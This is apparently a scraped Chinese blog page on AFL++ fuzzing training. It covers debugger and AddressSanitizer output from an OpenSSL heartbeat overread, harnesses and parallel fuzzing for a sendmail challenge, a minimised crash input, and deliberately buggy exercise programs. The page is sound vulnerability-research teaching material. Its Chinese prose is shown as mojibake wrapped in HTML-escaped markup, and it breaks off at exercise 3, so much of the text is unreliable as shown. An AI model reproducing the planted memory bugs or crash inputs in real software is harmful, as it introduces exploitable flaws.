‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
00:0000‚îÇ rsp 0x7fffffffd4e0 ‚Äî‚ñ∏ 0xc34000001b0 ‚óÇ‚Äî 0x0
01:0008‚îÇ     0x7fffffffd4e8 ‚Äî‚ñ∏ 0x6180000000f0 ‚óÇ‚Äî 0x0
02:0010‚îÇ     0x7fffffffd4f0 ‚Äî‚ñ∏ 0x618000000080 ‚óÇ‚Äî 0x200000000301
03:0018‚îÇ     0x7fffffffd4f8 ‚óÇ‚Äî 0x644300005203
04:0020‚îÇ     0x7fffffffd500 ‚Äî‚ñ∏ 0x618000000118 ‚óÇ‚Äî 0x0
05:0028‚îÇ     0x7fffffffd508 ‚Äî‚ñ∏ 0x7fffffffd640 ‚óÇ‚Äî 0x3fff800
06:0030‚îÇ     0x7fffffffd510 ‚Äî‚ñ∏ 0x7fffffffd540 ‚óÇ‚Äî 0x41b58ab3
07:0038‚îÇ     0x7fffffffd518 ‚Äî‚ñ∏ 0xc34000001b6 ‚óÇ‚Äî 0x0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚ñ∫ 0   0x555555744c9d tls1_process_heartbeat+765
   1   0x5555557b912a ssl3_read_bytes+13306
   2   0x5555557bdcda ssl3_get_message+538
   3   0x555555786697 ssl3_get_client_hello+535
   4   0x5555557823ed ssl3_accept+3405
   5   0x555555737a80 main+448
   6   0x7ffff7829d90 __libc_start_call_main+128
   7   0x7ffff7829e40 __libc_start_main+128
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
pwndbg&amp;gt; ni
=================================================================
==8348==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 8348) fork to child process 8359]
[New inferior 2 (process 8359)]
[Detaching after fork from parent process 8348]
[Inferior 1 (process 8348) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 8359 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
Warning:
Cannot insert breakpoint 2.
Cannot access memory at address 0x5555557b9125
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sendmail_1301&#34;&gt;sendmail_1301:&lt;/h2&gt;
&lt;h3 id=&#34;ÂâçË®Ä-3&#34;&gt;ÂâçË®ÄÔºö&lt;/h3&gt;
&lt;p&gt;Êú¨Êñá‰∏∫afl-trainingÁöÑÁ¨¨‰∏âÁØáÔºåÈíàÂØπ&lt;code&gt;sendmail&lt;/code&gt;ÁöÑfuzzÔºåÊØîËæÉ‰∫Ü‰∏Ä‰∏ãÊôÆÈÄöharnessÊôÆÈÄöfuzz‰∏éÂπ∂Ë°åfuzzÁöÑÊïàÁéáÊèêÂçáÔºå‰ª•ÂèäÊôÆÈÄöharness‰∏é‰ºòÂåñËøáÂêéÁöÑharnessËøõË°åfuzzÊó∂ÁöÑÊïàÁéáÂ∑ÆÂà´&lt;/p&gt;
&lt;h3 id=&#34;ÂáÜÂ§áÂ∑•‰Ωú-3&#34;&gt;ÂáÜÂ§áÂ∑•‰ΩúÔºö&lt;/h3&gt;
&lt;p&gt;ËøôÈÅìÈ¢òÂ∑≤ÁªèÂáÜÂ§áÂ•Ω‰∫Ü&lt;code&gt;harness&lt;/code&gt;&lt;br&gt;
Ê†πÊçÆ&lt;code&gt;makefile&lt;/code&gt;Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-makefile&#34;&gt;CFLAGS ?= -g

m1-bad: mime1-bad.c main.c
	${CC} ${CFLAGS} -o m1-bad mime1-bad.c main.c -I .

clean:
	rm -f *-bad *-ok
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êàë‰ª¨ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáè&lt;code&gt;export CC=afl-clang-fast&lt;/code&gt;ÂêémakeÂç≥ÂèØ&lt;br&gt;
ÁîüÊàê&lt;code&gt;m1-bad&lt;/code&gt;ÔºåÊµãËØï‰∏Ä‰∏ãËÉΩÊ≠£Â∏∏ËøêË°å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/ÊñáÊ°£/fuzzing/afl-training/challenges/sendmail/1301$ ./m1-bad 1.txt 
buf-obuf=64
obp-obuf=0
canary-obuf=4294967268
canary = GOOD
obuf = 1

canary should be GOOD
canary = GOOD
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fuzzing-2&#34;&gt;Fuzzing:&lt;/h3&gt;
&lt;p&gt;Âª∫Â•ΩÊñá‰ª∂Â§πÂíåÁîüÊàêÈöèÊú∫ÁßçÂ≠ê‰πãÂêéÂºÄÂßãfuzz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;afl-fuzz -i ipt/ -o opt/ -- ./m1-bad @@
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≤°Êúâ‰øÆÊîπËøáÁöÑ&lt;code&gt;harness&lt;/code&gt;ÁºñËØëÂá∫ÁöÑËøõË°åfuzzÊó∂Ë°®Áé∞Â¶Ç‰∏ãÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660225566.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Âú®3minÂ∑¶Âè≥ÁöÑÊó∂ÂÄôË∑ëÂá∫‰∫ÜcrashÔºõ&lt;/p&gt;
&lt;p&gt;ÁÑ∂ÂêéÊàë‰ª¨‰ΩøÁî®Âπ∂Ë°åfuzzÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;afl-fuzz -i ipt1/ -o opt1/ -M f1 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f2 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f3 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f4 -- ./m1-bad @@
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËøôÊ¨°Êàë‰ª¨‰∏çÂà∞1min‰∏ªfuzzerÂ∞±Ë∑ëÂá∫‰∫ÜcrashÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660232590.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ÊúÄÂêéÊàë‰ª¨ÊµãËØï‰∏Ä‰∏ãÂª∂ËøüÂàùÂßãÂåñÂíåÊåÅ‰πÖÂåñÊ®°ÂºèÈúÄË¶ÅÂ§ö‰πÖËÉΩË∑ëÂá∫,‰øÆÊîπ‰∏Ä‰∏ãharness:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;quot;my-sendmail.h&amp;quot;
#include &amp;lt;assert.h&amp;gt;

int main(int argc, char **argv)
{

     HDR *header;
     register ENVELOPE *e;
     FILE *temp;

     #ifdef __AFL_HAVE_MANUAL_CONTROL
     __AFL_INIT();
     #endif 
     while(__AFL_LOOP(1000))
     {
          assert(argc == 2);
          temp = fopen(argv[1], &amp;quot;r&amp;quot;);
          assert(temp != NULL);

          header = (HDR *)malloc(sizeof(struct header));

          header-&amp;gt;h_field = &amp;quot;Content-Transfer-Encoding&amp;quot;;
          header-&amp;gt;h_value = &amp;quot;quoted-printable&amp;quot;;
          header-&amp;gt;h_link = NULL;
          header-&amp;gt;h_flags = 0;

          e = (ENVELOPE *)malloc(sizeof(struct envelope));
          e-&amp;gt;e_id = &amp;quot;First Entry&amp;quot;;
          e-&amp;gt;e_dfp = temp;


          mime7to8(header, e);

          fclose(temp);
          free(e);
          free(header);
          return 0;
     }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÈáçÊñ∞makeÂêéËøõË°åfuzzÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660239113.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Âú®2min30sÂ∑¶Âè≥Ë∑ëÂá∫crashÔºåÁõ∏ËæÉ‰∫éÊúÄÂéüÂßãÁöÑharnessËøòÊòØÊúâÊïàÁéáÊèêÂçáÁöÑ&lt;/p&gt;
&lt;h3 id=&#34;crashÂàÜÊûê-3&#34;&gt;crashÂàÜÊûêÔºö&lt;/h3&gt;
&lt;p&gt;‰ΩøÁî®&lt;code&gt;afl-tmin&lt;/code&gt;Á≤æÁÆÄÊ†∑Êú¨Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./m1-bad @@;done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂæóÂà∞ÁÆÄÂåñÂêéÊ†∑Êú¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/ÊñáÊ°£/fuzzing/afl-training/challenges/sendmail/1301/opt1/f1/crashes/tmp$ hexdump -C id\:000000\,sig\:11\,src\:000038\,time\:3687\,execs\:21373\,op\:havoc\,rep\:1 
00000000  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000230  30 30 30 30 30 30 30 30  30 30 30 3d 0a 30 30 30  |00000000000=.000|
00000240  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000260  30 30 30 3d 0a 30 30 30  30 30 30                 |000=.000000|
0000026b
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂêéÁî®&lt;code&gt;AFL_USE_ASAN=1&lt;/code&gt;ÁöÑÁºñËØëÈÄâÈ°πÈáçÊñ∞ÁºñËØë‰∫Ü‰∏Ä‰ªΩ‰πãÂêéË∑ëÊ†∑Êú¨Á°ÆÂÆöcrashÂèëÁîüÂ§ÑÁ°ÆÂÆû‰∏éÁªôÂá∫ÁöÑ&lt;code&gt;mime1-bad.c&lt;/code&gt;‰∏≠Ê≥®Èáä&lt;code&gt;BAD&lt;/code&gt;ÁöÑÂú∞ÊñπÂêªÂêà&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;==2927476==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffdc92 at pc 0x555555631800 bp 0x7fffffffdbb0 sp 0x7fffffffdba8
WRITE of size 1 at 0x7fffffffdc92 thread T0
[Attaching after Thread 0x7ffff7e9cc40 (LWP 2927476) fork to child process 2927479]
[New inferior 2 (process 2927479)]
[Detaching after fork from parent process 2927476]
[Inferior 1 (process 2927476) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 2927479 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
    #0 0x5555556317ff in mime_fromqp /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:248:18
    #1 0x5555556317ff in mime7to8 /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:156:7
    #2 0x5555556323c6 in main /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/sendmail/1301/main.c:94:11
    #3 0x7ffff7c29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0x7ffff7c29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #5 0x5555555733f4 in _start (/home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/sendmail/1301/opt/default/crashes/m1-bad+0x1f3f4) (BuildId: 774480b07edb24c4f93faf62426d5928c809433f)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;Â∞èÁªì&#34;&gt;Â∞èÁªìÔºö&lt;/h2&gt;
&lt;p&gt;‰ª•‰∏ä‰∏∫afl-trainingÂá†‰∏™ÂÖ∑Êúâ‰ª£Ë°®ÊÄßÁöÑÁªÉ‰π†ÔºåÂ∏ÆÂä©ÁÜüÊÇâafl++ÁöÑfuzzÊµÅÁ®ãÔºåÁé∞Êï¥Âêà‰∏∫1ÁØá&lt;/p&gt;
">afl_training </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/5Wt1I5xiU/"" data-c="
          &lt;p&gt;È°πÁõÆÂú∞ÂùÄ:&lt;a href=&#34;https://github.com/alex-maleno/Fuzzing-Module&#34;&gt;https://github.com/alex-maleno/Fuzzing-Module&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise1&#34;&gt;execersise1:&lt;/h3&gt;
&lt;p&gt;‰ª•‰∏ãÁ®ãÂ∫èÂ≠òÂú®ÈóÆÈ¢ò&lt;br&gt;
ÂΩìËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÁ¨¨‰∏Ä‰∏™ÊàñÊúÄÂêé‰∏Ä‰∏™Â≠óÁ¨¶‰∏∫&lt;code&gt;\x00&lt;/code&gt;Êó∂Ëß¶Âèë&lt;code&gt;abort()&lt;/code&gt;&lt;br&gt;
ÂÖ∂Ê¨°ÂΩìÂæ™ÁéØÈÅçÂéÜÂà∞ÁöÑÂΩìÂâçÂ≠óÁ¨¶ÁöÑÊï∞Â≠óÊØîÂâç‰∏Ä‰∏™ÈÅçÂéÜÂà∞ÁöÑÊï∞Â≠óÂ§ß1Êó∂Ëß¶Âèë&lt;code&gt;abort()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

using namespace std;

int main() {

   string str;

   cout &amp;lt;&amp;lt; &amp;quot;enter input string: &amp;quot;;
   getline(cin, str);
   cout &amp;lt;&amp;lt; str &amp;lt;&amp;lt; endl &amp;lt;&amp;lt; str [0] &amp;lt;&amp;lt; endl;

    if(str[0] == 0 || str[str.length() - 1] == 0) {
        abort();
    }
    else {
        int count = 0;
        char prev_num = &#39;x&#39;;
        while (count != str.length() - 1) {
            char c = str[count];
            if(c &amp;gt;= 48 &amp;amp;&amp;amp; c &amp;lt;= 57) {
                if(c == prev_num + 1) {
                    abort();
                }
                prev_num = c;
            } 
            count++;
        }
    }
    
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂΩìÂâçÁõÆÂΩï‰∏ãÂàõÂª∫&lt;code&gt;ipt,opt&lt;/code&gt;Êñá‰ª∂Â§πÔºåÂú®&lt;code&gt;ipt/&lt;/code&gt;‰∏ãÁîüÊàêÈöèÊú∫ÁßçÂ≠ê&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dd if=/dev/urandom of=1.in bs=64 count=10
dd if=/dev/urandom of=2.in bs=64 count=10
dd if=/dev/urandom of=3.in bs=64 count=10
dd if=/dev/urandom of=4.in bs=64 count=10
dd if=/dev/urandom of=5.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§ÁºñËØëÁõÆÊ†á&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast++ simple_crash.cpp -o sc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âú®ÂΩìÂâçÁõÆÊ†áÊñá‰ª∂Â§π‰∏ãÂàÜÂà´Êñ∞Âª∫‰∏Ä‰∏™Áî®‰∫éËæìÂÖ•ÁöÑÊñá‰ª∂Â§πÂíåËæìÂá∫ÁöÑÊñá‰ª∂Â§π&lt;br&gt;
ÁÑ∂ÂêéÂºÄÂßãfuzz&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-fuzz -i ipt/ -o opt/ -- ./sc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êú¨Âú∞ÁéØÂ¢É‰∏ãÊµãËØï‰∏çÂà∞1minËÉΩÂ∞Ü‰ª•‰∏äËß¶Âèë&lt;code&gt;abort()&lt;/code&gt;ÁöÑËæìÂÖ•ÂÖ®ÈÉ®Ë∑ëÂá∫ÔºåËæìÂá∫Â≠ò‰∫écrashÁöÑÊñá‰ª∂Â§π‰∏ã&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977152581.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise2&#34;&gt;execersise2:&lt;/h3&gt;
&lt;p&gt;‰∏ªË¶ÅÈÄªËæëÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;/*
 * George Sidamon-Eristoff
 * 30 March 2022
 * Comp 98 - Senior Capstone, 2nd Semester
 * airplane_object.cpp contains the function contracs and definitions for the Airplane class
 *
 * Note: there are purposely not many comments so the bug is more difficult to find
 */

#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;

#include &amp;quot;airplane_object.hpp&amp;quot;


Airplane::Airplane(){
    crew.num = 2;
    crew.captain_name = &amp;quot;Captain&amp;quot;;
    crew.copilot_name = &amp;quot;CoPilot&amp;quot;;
}


void Airplane::takeoff(){
    if (crew.num &amp;gt;= 1) {
        std::cout &amp;lt;&amp;lt; &amp;quot;Takeoff!\n&amp;quot;;
    } else {
        std::cout &amp;lt;&amp;lt; &amp;quot;Nobody to fly the plane!\n&amp;quot;;
    }
    return;
}

void Airplane::land(){
    if (crew.num &amp;gt;= 1) {
        std::cout &amp;lt;&amp;lt; &amp;quot;Landed safely!\n&amp;quot;;
    } else {
        std::cout &amp;lt;&amp;lt; &amp;quot;Nobody left to land the plane!\n&amp;quot;;
    }
    return;
}

void Airplane::hire(){
    crew.num += 1;
    std::cout &amp;lt;&amp;lt; &amp;quot;Welcome aboard!\n&amp;quot;;
    return;
}


void Airplane::fire(){
    crew.num -= 1;
    std::cout &amp;lt;&amp;lt; &amp;quot;You&#39;re out of here!\n&amp;quot;;
    return;
}

void Airplane::interact() {
    std::string input  = &amp;quot;&amp;quot;;
    getline(std::cin, input);
    int input_length = input.length();
    if (input.empty()) {
        std::cout &amp;lt;&amp;lt; &amp;quot;No command.\n&amp;quot;;
    } else {
        int i = 0;
        while (input[i] != &#39;q&#39; and i &amp;lt; input_length) {
            // std::cout &amp;lt;&amp;lt; &amp;quot;i = &amp;quot; &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot;  input[i] =&amp;quot; &amp;lt;&amp;lt; input[i] &amp;lt;&amp;lt; &amp;quot;\n&amp;quot;;
            if (input[i] == &#39;t&#39;) {
                takeoff();
            } else if (input[i] == &#39;l&#39;) {
                if (crew.num == 0) {
                    abort();
                }
                land();
            } else if (input[i] == &#39;h&#39;) {
                hire();
            } else if (input[i] == &#39;f&#39;) {
                fire();
            }
            i++;
        }
    }
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂΩìËæìÂÖ•&lt;code&gt;l&lt;/code&gt;Êó∂‰ºöÂà§Êñ≠&lt;code&gt;crew&lt;/code&gt;ÁöÑÊï∞ÈáèÔºåÂΩì&lt;code&gt;crew.num==0&lt;/code&gt;Êó∂Á®ãÂ∫èËß¶Âèë&lt;code&gt;abort()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Ê≠§È¢ò‰ΩøÁî®cmakeÔºåÂΩìÂâçÁ™óÂè£‰∏¥Êó∂ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèÊåáÂÆöÁºñËØëÂô®ÔºåËÆæÁΩÆÂ•Ω‰πãÂêé&lt;code&gt;env | grep &lt;/code&gt;Êü•Áúã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  export CC=afl-clang-fast
  export CXX=afl-clang-fast++
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁÑ∂Âêé&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cmake . &amp;amp;&amp;amp; make 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰πãÂêéÊ≠£Â∏∏fuzzÔºåË∑ëÂá∫7‰∏™crashÔºå‰∏îÈÉΩÁ¨¶Âêà‰∏äËø∞Ëß¶Âèë&lt;code&gt;abort()&lt;/code&gt;ÁöÑÊù°‰ª∂&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977163715.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise3&#34;&gt;execersise3:&lt;/h3&gt;
